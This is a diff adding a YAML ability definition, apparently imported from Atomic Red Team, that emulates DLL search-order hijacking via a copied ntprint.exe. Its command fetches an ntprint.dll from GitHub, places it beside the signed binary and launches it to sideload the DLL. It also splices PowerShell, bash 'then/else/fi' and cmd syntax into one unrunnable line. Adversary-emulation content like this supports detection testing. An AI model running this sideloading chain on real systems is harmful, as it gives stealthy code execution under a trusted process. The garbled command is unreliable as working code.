@@ -1,0 +1,57 @@
+- id: e96b8105-d7f7-484e-8d81-2d0c7086971b
+  name: DLL Search Order Hijacking - ntprint
+  description: 'This technique abuses the legitimate, Microsoft-signed ntprint.exe
+    as a living-off-the-land loader by copying it out of C:\Windows\System32 into
+    a user-controlled directory and launching it with the next command-line PSetupElevatedLegacyPrintDriverInstallW,
+    which causes the process to attempt to load ntprint.dll; due to Windows DLL search
+    behavior, placing a malicious ntprint.dll in the same directory results in that
+    DLL being loaded alongside the trusted binary, providing code execution inside
+    a seemingly benign Windows component and blending activity under a signed process
+    name (a classic DLL sideloading/search-order hijack pattern)
+
+    Reference: https://www.hexacorn.com/blog/2025/10/06/ntprint-exe-lolbin/'
+  tactic: stealth
+  technique:
+    attack_id: T1574.001
+    name: 'Hijack Execution Flow: DLL'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1574.001\bin\ntprint.dll") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1574.001\bin\ntprint.dll")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/ntprint.dll?raw=true"
+          -OutFile "PathToAtomicsFolder\T1574.001\bin\ntprint.dll"; fi; mkdir "%USERPROFILE%\atomic";
+          cd "%USERPROFILE%\atomic"; copy "PathToAtomicsFolder\T1574.001\bin\ntprint.dll"
+          .; copy /y C:\Windows\System32\ntprint.exe .; ntprint.exe PSetupElevatedLegacyPrintDriverInstallW
+          {}'
+        cleanup: cd "%USERPROFILE%"; rmdir /s /q "%USERPROFILE%\atomic"
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1574.001
+  - stealth
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      ntprint_dll_file:
+        type: path
+        default: PathToAtomicsFolder\T1574.001\bin\ntprint.dll
+        description: ntprint.dll custom
+    dependencies:
+    - description: ntprint.dll must exist on disk at specified location (#{ntprint_dll_file})
+      prereq_command: 'if (Test-Path "#{ntprint_dll_file}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{ntprint_dll_file}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/ntprint.dll?raw=true"
+        -OutFile "#{ntprint_dll_file}"'
+    technique_created: '2020-03-13T18:11:08.357Z'
+    atomic_guid: e96b8105-d7f7-484e-8d81-2d0c7086971b
+    import_timestamp: '2026-07-20T05:40:12.386368Z'
